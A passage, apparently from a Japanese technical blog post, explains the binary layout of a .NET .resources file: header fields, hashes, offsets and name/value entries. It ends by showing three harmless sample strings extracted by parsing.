	ReaderName:                             (s) b'lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet'
	ResourceFileVersion:                    (I) 0x2
	NumberOfActualResources:                (I) 0x3
	NumberOfResourceTypes:                  (I) 0x0
```

NumberOfActualResourcesがリソースの数を表します。
そして、RESOURCE_FILEの後は
```
パディング(PADPADP)
リソース1のハッシュ値
リソース2のハッシュ値　
リソース3のハッシュ値
リソース1のオフセット
リソース2のオフセット
リソース3のオフセット
```
0x00000105?(この0x105がわからない) と続き、
その後に、
```
リソース1の名前のサイズ
リソース1の名前
リソース2の名前のサイズ
リソース2の名前
リソース3の名前のサイズ
リソース3の名前
リソース1の値のサイズ
リソース1の値
リソース2の値のサイズ
リソース2の値
リソース3の値のサイズ
リソース3の値
```
となります。

ここをパースすることで、リソースを取得することができました。

```
{'String1': 'Hello world!', 'String2': 'hoge fuga', 'String3': 'string test'}
```
